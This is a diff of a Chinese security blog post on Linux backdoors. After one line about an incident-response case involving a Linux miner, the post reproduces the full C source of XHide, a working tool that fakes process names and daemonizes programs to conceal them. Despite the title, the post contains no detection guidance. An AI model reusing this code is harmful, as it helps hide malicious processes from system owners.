@@ -5,7 +5,7 @@
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 	
-	<title>清夜无尘の一方天地 </title>
+	<title>清夜无尘の一方天地  | Linux常见后门及排查技术</title>
 	<meta name="viewport" content="width=device-width,minimum-scale=1">
 	<meta name="generator" content="Hugo 0.128.0">
 	
@@ -27,9 +27,6 @@
 
 	
 
-	
-	<link rel="alternate" href="/tags/meta/index.xml" type="application/rss+xml" title="清夜无尘の一方天地">
-	<link rel="feed" href="/tags/meta/index.xml" type="application/rss+xml" title="清夜无尘の一方天地">
 	
 	
 	
@@ -148,23 +145,295 @@ onload='renderMathInElement(document.body);'></script>
 		<header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl">
 			<div
 				class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2">
-					<div class="pb-4">
-		<h1 >
-			<a href="https://wander1ng.com/" title="清夜无尘の一方天地" class="heading font-cursive icon">清夜无尘の一方天地</a>
-		</h1>
-	</div>
+				
+<div>
+	<h2>
+		<a href="https://wander1ng.com/" title="清夜无尘の一方天地" class="heading font-cursive icon">清夜无尘の一方天地</a>
+	</h2>
+</div>
+<h1 class="pt-2">Linux常见后门及排查技术</h1>
+
+<h3 class="text-java-700 font-normal leading-relaxed pt-2">说实话Linux的样本一点都调不来</h3>
+
+<div class="flex flex-wrap justify-end pt-2 "><div class="md:flex-grow-0 font-light">
+	
+
+	
+
+	
+	
+	
+	
+	<a class="post-taxonomy-tag text-eucalyptus-500"
+		href='/tags/%E6%8A%80%E6%9C%AF'>技术</a>
+	
+	
+	
+</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4"
+		datetime="2024-11-22T17:49:53&#43;08:00">2024-11-22</time>
+</div>
+
+<hr />
+
+
+			</div>
+		</header>
+		<main role="main" class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
+			
+
+<article>
+	<section class="mx-auto content">
+		<div class="c-rich-text"><p>今天遇到一个清华的现场，从C2取回样本来发现是Linux挖矿的，VT检出是Xhide，由此延伸记录一下。</p>
+<h4 id="常见技巧之添加root权限后门用户">常见技巧之添加Root权限后门用户</h4>
+<p>最后贴一下Github上的xhide源代码：</p>
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;pwd.h&gt;
+#include &lt;grp.h&gt;
+
+void usage(char *progname);
+
+int changeown (char *str)
+{
+	char user[256], *group;
+	struct passwd *pwd;
+	struct group *grp;
+
+	uid_t uid;
+	gid_t gid;
+
+	memset(user, &#39;\0&#39;, sizeof(user));
+	strncpy(user, str, sizeof(user));
+
+	for (group = user; *group; group++)
+		if (*group == &#39;:&#39;)
+		{
+			*group = &#39;\0&#39;;
+			group++;
+			break;
+		}
+
+	if (pwd = getpwnam(user)) 
+	{
+
+		uid = pwd-&gt;pw_uid;
+		gid = pwd-&gt;pw_gid;
+	} else uid = (uid_t) atoi(user);
+
+	if (*group)
+		if (grp = getgrnam(group)) gid = grp-&gt;gr_gid;
+		else gid = (gid_t) atoi(group);
+
+	if (setgid(gid)) {
+		perror(&#34;Error: Can&#39;t set GID&#34;);
+		return 0;
+	}
+
+	if (setuid(uid))
+	{
+		perror(&#34;Error: Can&#39;t set UID&#34;);
+		return 0;
+	}
+
+	return 1;
+}
+
+char *fullpath(char *cmd)
+{
+	char *p, *q, *filename;
+	struct stat st;
+
+	if (*cmd == &#39;/&#39;)
+		return cmd;
+
+	filename = (char *) malloc(256);
+
+	if  (*cmd == &#39;.&#39;)
+		if (getcwd(filename, 255) != NULL)
+		{
+			strcat(filename, &#34;/&#34;);
+			strcat(filename, cmd);
+			return filename;
+		}
+		else
+			return NULL;
+
+	for (p = q = (char *) getenv(&#34;PATH&#34;); q != NULL; p = ++q)
+	{
+		if (q = (char *) strchr(q, &#39;:&#39;))
+			*q = (char) &#39;\0&#39;;
+
+		snprintf(filename, 256, &#34;%s/%s&#34;, p, cmd);
+
+		if (stat(filename, &amp;st) != -1
+				&amp;&amp; S_ISREG(st.st_mode)
+				&amp;&amp; (st.st_mode&amp;S_IXUSR || st.st_mode&amp;S_IXGRP || st.st_mode&amp;S_IXOTH))
+			return filename;
+
+		if (q == NULL)
+			break;
+	}
+
+	free(filename);
+
+	return NULL;
+
+}
+
+void usage(char *progname)
+{
+	fprintf(stderr, &#34;XHide - Process Faker, by Schizoprenic &#34;
+			&#34;Xnuxer Research (c) 2002\n\nOptions:\n&#34;
+
+			&#34;-s string\tFake name process\n&#34;
+			&#34;-d\t\tRun aplication as daemon/system (optional)\n&#34; 
+			&#34;-u uid[:gid]\tChange UID/GID, use another user (optional)\n&#34; 
+			&#34;-p filename\tSave PID to filename (optional)\n\n&#34;
+
+			&#34;Example: %s -s \&#34;klogd -m 0\&#34; -d -p test.pid ./egg bot.conf\n\n&#34;,progname);
+
+	exit(1);
+}
+
+int main(int argc,char **argv)
+{
+	char c;
+	char fake[256];
+	char *progname, *fakename;
+	char *pidfile, *fp;
+	char *execst;
+
+	FILE *f;
+
+	int runsys=0, null;
+	int j,i,n,pidnum;
+	char **newargv;
+
+	progname = argv[0];
+	if(argc&lt;2) usage(progname);
+
+	for (i = 1; i &lt; argc; i++)
+	{
+		if (argv[i][0] == &#39;-&#39;)
+			switch (c = argv[i][1])
+			{
+
+				case &#39;s&#39;: fakename = argv[++i]; break;
+				case &#39;u&#39;: changeown(argv[++i]); break; 
+				case &#39;p&#39;: pidfile = argv[++i]; break;
+				case &#39;d&#39;: runsys = 1; break;
+
+				default:  usage(progname); break;
+			}
+		else break;
+	}
+
+	if (!(n = argc - i) || fakename == NULL) usage(progname);
+
+	newargv = (char **) malloc(n * sizeof(char **) + 1);
+	for (j = 0; j &lt; n; i++,j++) newargv[j] = argv[i];
+	newargv[j] = NULL;
+
+	if ((fp = fullpath(newargv[0])) == NULL) { perror(&#34;Full path seek&#34;); exit(1); }
+	execst = fp;
+
+	if (n &gt; 1)
+	{
+		memset(fake, &#39; &#39;, sizeof(fake) - 1);
+		fake[sizeof(fake) - 1] = &#39;\0&#39;;
+		strncpy(fake, fakename, strlen(fakename));
+		// Kent, this is the key point.. keke
+		newargv[0] = fake;
+		/*for (int i = 1; i &lt; n; i++) newargv[i] = &#34;&#34;;*/
+	}
+	else newargv[0] = fakename;
+
+	if (runsys) 
+	{
+		if ((null = open(&#34;/dev/null&#34;, O_RDWR)) == -1)
+		{
+			perror(&#34;Error: /dev/null&#34;);
+			return -1;
+		}
+
+		switch (fork())
+		{
+			case -1:
+				perror(&#34;Error: FORK-1&#34;);
+				return -1;
+
+			case  0:
+				setsid();
+				switch (fork())
+				{
+
+					case -1:
+						perror(&#34;Error: FORK-2&#34;);
+						return -1;
+
+					case  0:
+						umask(0);
+						close(0);
+						close(1);
+						close(2);
+						dup2(null, 0);
+						dup2(null, 1);
+						dup2(null, 2);
+
+						break;
+
+					default:
+						return 0;
+				}
+				break;
+			default:
+				return 0;
+		}
+	}
+
+	waitpid(-1, (int *)0, 0);        
+	pidnum = getpid();
+
+	if (pidfile != NULL &amp;&amp; (f = fopen(pidfile, &#34;w&#34;)) != NULL)
+	{
+		fprintf(f, &#34;%d\n&#34;, pidnum);
+		fclose(f);
+	}
+
+	fprintf(stderr,&#34;==&gt; Fakename: %s PidNum: %d\n&#34;,fakename,pidnum); 
+	execv(execst, newargv);
+	perror(&#34;Couldn&#39;t execute&#34;);
+	return -1;
+}
+</code></pre></div>
+	</section>
+
+
+</article>
+
+		</main>
+		<div class="w-full h-0 flex-none order-3"></div>
+		<aside role="contentinfo"
+			class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
+			<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
+				
+	<div class="md:max-w-xs  flex flex-col md:items-end">
 	<ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col">
 	
 	
 	<li class="px-1 md:px-0">
-		<a href="/post/" title="Post page" >
+		<a href="/post/" title="Post page" 
+			class="font-medium text-medium-red-violet-600 hover:text-medium-red-violet-400" >
 			Post
 		</a>
 	</li>
 	
 	<li class="px-1 md:px-0">
-		<a href="/tags/" title="Tags page" 
-			class="font-medium text-medium-red-violet-600 hover:text-medium-red-violet-400" >
+		<a href="/tags/" title="Tags page" >
 			Tags
 		</a>
 	</li>
@@ -175,10 +444,6 @@ onload='renderMathInElement(document.body);'></script>
 		</a>
 	</li>
 	
-	
-	<li>
-		<a href='/tags/meta/index.xml'>RSS</a>
-	</li>
 	
 	
 	
@@ -192,163 +457,6 @@ onload='renderMathInElement(document.body);'></script>
 	</div>
 	
 </ul>
-			</div>
-		</header>
-		<main role="main" class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
-			
-<h1 class="pb-4">
-	Meta
-</h1>
-<div>
-	<section>
-		
-		<div>
-			<div class="pb-8">
-	<div class="font-serif font-medium text-xl">
-		<a href="https://wander1ng.com/about/">
-			About
-		</a>
-	</div>
-	
-	
-	
-	
-	<div class="font-serif text-gray-600 font-light pt-1">
-		关于我的二三事</div>
-
-	
-	<div class="flex flex-wrap justify-between pt-1"><div class="md:flex-grow-0 font-light">
-	
-
-	
-
-	
-	
-	
-	
-	<a class="post-taxonomy-tag text-eucalyptus-500"
-		href='/tags/meta'>Meta</a>
-	
-	
-	
-</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light"
-			datetime="2019-06-19T22:02:31&#43;08:00">2019-6-19</time>
-	</div>
-</div>
-
-		</div>
-		
-		<div>
-			<div class="pb-8">
-	<div class="font-serif font-medium text-xl">
-		<a href="https://wander1ng.com/post/gensis/">
-			Gensis
-		</a>
-	</div>
-	
-	
-	
-	
-	<div class="font-serif text-gray-600 font-light pt-1">
-		Blog初创，天地异象</div>
-
-	
-	<div class="flex flex-wrap justify-between pt-1"><div class="md:flex-grow-0 font-light">
-	
-
-	
-
-	
-	
-	
-	
-	<a class="post-taxonomy-tag text-eucalyptus-500"
-		href='/tags/meta'>Meta</a>
-	
-	
-	
-</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light"
-			datetime="2019-06-19T02:56:00&#43;08:00">2019-6-19</time>
-	</div>
-</div>
-
-		</div>
-		
-	</section>
-</div>
-
-		</main>
-		<div class="w-full h-0 flex-none order-3"></div>
-		<aside role="contentinfo"
-			class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
-			<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
-				
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="md:max-w-xs  flex flex-col md:items-end pt-2">
 	
 
 <div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col  max-h-16">
@@ -466,25 +574,96 @@ onload='renderMathInElement(document.body);'></script>
 	
 </div>
 
-	<div class="a-gray text-sm text-gray-500 leading-tight">
+	<div class="text-sm text-gray-500 leading-tight a-gray">
 		Copyright © 2019–2024
 		<br />
-		Built with Hugo and theme <a 
-			href="https://github.com/heyeshuang/hugo-theme-tokiwa">Tokiwa</a>.
-			<br />
-			32 pages, 33005 words in total.
+		Built with Hugo and theme <a href="https://github.com/heyeshuang/hugo-theme-tokiwa">Tokiwa</a>. 625 words in this page.
 	</div>
 </div>
+
 			</div>
 		</aside>
 		<footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2">
 			
+<hr class="double-line" />
+<div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
+    
+    <a class="flex-grow-0" href="/post/vt%E9%AB%98%E7%BA%A7%E8%AF%AD%E6%B3%95/">
+        <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
+            height="24">
+            <path fill="none" d="M0 0h24v24H0z" />
+            <path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z" /></svg>
+        VT高级语法
+    </a>
+    
+    
+</div>
+<div >
 
 
 
+<div class="font-serif pb-2 flex align-start leading-loose">
+	<span class="heading pr-6 leading-loose">Related</span>
+	<span >
+		
+			<a href="/post/vt%E9%AB%98%E7%BA%A7%E8%AF%AD%E6%B3%95/">VT高级语法</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E6%B5%85%E6%9E%90%E5%8F%82%E8%80%83%E8%AF%AD%E9%9B%80p1ut0/">钓鱼邮件浅析(参考语雀P1ut0)</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/certutil%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/">Certutil在渗透中的使用</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/%E9%9F%A9%E5%9B%BD%E6%96%B9%E5%90%91apt-q-12%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">韩国方向APT-Q-12漏洞利用复现分析</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/msi%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E5%8F%8A%E7%9B%B8%E5%85%B3apt%E7%BB%84%E7%BB%87%E6%89%8B%E6%B3%95/">Msi恶意文件及相关APT组织手法</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/msi-transforms%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/">MSI TRANSFORMS技术分析</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/confucius%E7%BB%84%E7%BB%87%E5%88%A9%E7%94%A8ads%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E5%87%BB%E6%B4%BB%E5%8A%A8/">Confucius组织利用ADS隐藏技术的攻击活动</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/living-off-the-land-binaries/">Living Off the Land Binaries</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/dga%E5%92%8C%E5%8A%A8%E6%80%81%E5%9F%9F%E5%90%8D/">DGA和动态域名</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/%E5%B8%B8%E8%A7%81%E9%9A%A7%E9%81%93%E5%B7%A5%E5%85%B7%E5%AE%9E%E7%8E%B0/">常见隧道工具实现</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5rss%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/">威胁情报RSS体系构建</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/%E9%9F%A9%E5%9B%BD%E6%96%B9%E5%90%91apt-q-12%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/">韩国方向APT-Q-15攻击样本分析复现</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/%E5%8D%B0%E5%BA%A6%E6%96%B9%E5%90%91%E7%99%BD%E8%B1%A1apt%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0%E4%B8%80/">印度方向白象&amp;响尾蛇APT攻击样本分析复现(一)</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/%E6%9C%9D%E9%B2%9C%E6%96%B9%E5%90%91kimsukyapt%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0%E4%B8%80/">朝鲜方向Kimsuky组织APT攻击样本分析复现(一)</a>&nbsp;&nbsp;&#47;&nbsp;
+		
+			<a href="/post/%E8%B6%8A%E5%8D%97%E6%96%B9%E5%90%91%E6%B5%B7%E8%8E%B2%E8%8A%B1apt%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0%E4%B8%80/">越南方向海莲花APT攻击样本分析复现(一)</a>
+		
+</span>
+</div>
 
-
-
+</div>
+<hr />
+<div class="pb-2">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "LZX" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+<hr />
 
 		</footer>
 		
